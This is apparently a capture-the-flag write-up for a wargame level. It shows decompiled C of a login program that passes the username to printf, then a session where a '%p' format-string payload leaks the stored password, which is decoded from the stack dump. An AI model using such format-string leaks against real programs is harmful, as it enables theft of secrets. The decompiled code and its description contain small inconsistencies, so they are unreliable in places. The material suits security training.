int main(int argc, const char **argv, const char **envp)
{
  char name[100]; // [rsp+B0h] [rbp-70h] BYREF
  char password[118]; // [rsp+10h] [rbp-110h] BYREF
  char buffer[48]; // [rsp+80h] [rbp-A0h] BYREF
  int v5;
  int v8;
  int v9;
  FILE *stream

  memset(name, 0, sizeof(s));
  v8 = 0;
  memset(buffer, 0, 41);
  memset(password, 0, sizeof(password));
  v5 = 0;
  stream = 0LL;
  v9 = 0;
  stream = fopen("/home/users/level03/.pass", "r");
  if ( !stream )
  {
    fwrite("ERROR: failed to open password file\n", 1, 36, stderr);
    exit(1);
  }
  v9 = fread(buffer, 1, 0x29, stream);
  buffer[strcspn(buffer, "\n")] = 0;
  if ( v9 != 41 )
  {
    fwrite("ERROR: failed to read password file\n", 1, 36, stderr);
    fwrite("ERROR: failed to read password file\n", 1, 36, stderr);
    exit(1);
  }
  fclose(stream);
  puts("===== [ Secure Access System v1.0 ] =====");
  puts("/***************************************\\");
  puts("| You must login to access this system. |");
  puts("\\**************************************/");
  printf("--[ Username: ");
  fgets(name, 100, stdin);
  name[strcspn(name, "\n")] = 0;
  printf("--[ Password: ");
  fgets(password, 100, stdin);
  password[strcspn(password, "\n")] = 0;
  puts("*****************************************");
  if ( strncmp(buffer, password, 41) )
  {
    printf(name);
    puts(" does not have access!");
    exit(1);
  }
  printf("Greetings, %s!\n", name);
  system("/bin/sh");
}

The binary stores wordpass of the next level on a buffer on the stack, then takes 2 inputs using `fgets()`:
a name and a password and finally checks if the buffer() is equal to the `name` variable.

the issue is that if buffer ain't equal to the name the name is passed directly into printf() resulting in a printf format string vulnerability



level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/**\
| You must login to access this system. |
***/
--[ Username: %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
--[ Password: 
*
0x7fffffffe500(nil)(nil)0x2a2a2a2a2a2a2a2a0x2a2a2a2a2a2a2a2a0x7fffffffe6f80x1f7ff9a08(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)0x100000000(nil)0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d0xfeff00 does not have access!

756e505234376848    unPR47hH                  
45414a3561733951    EAJ5as9Q
377a7143574e6758    7zqCWNgX
354a35686e475873    5J5hnGXs
48336750664b394d    H3gPfK9M

Hh74RPnu Q9sa5JAE XgNWCqz7 sXGnh5J5 M9KfPg3H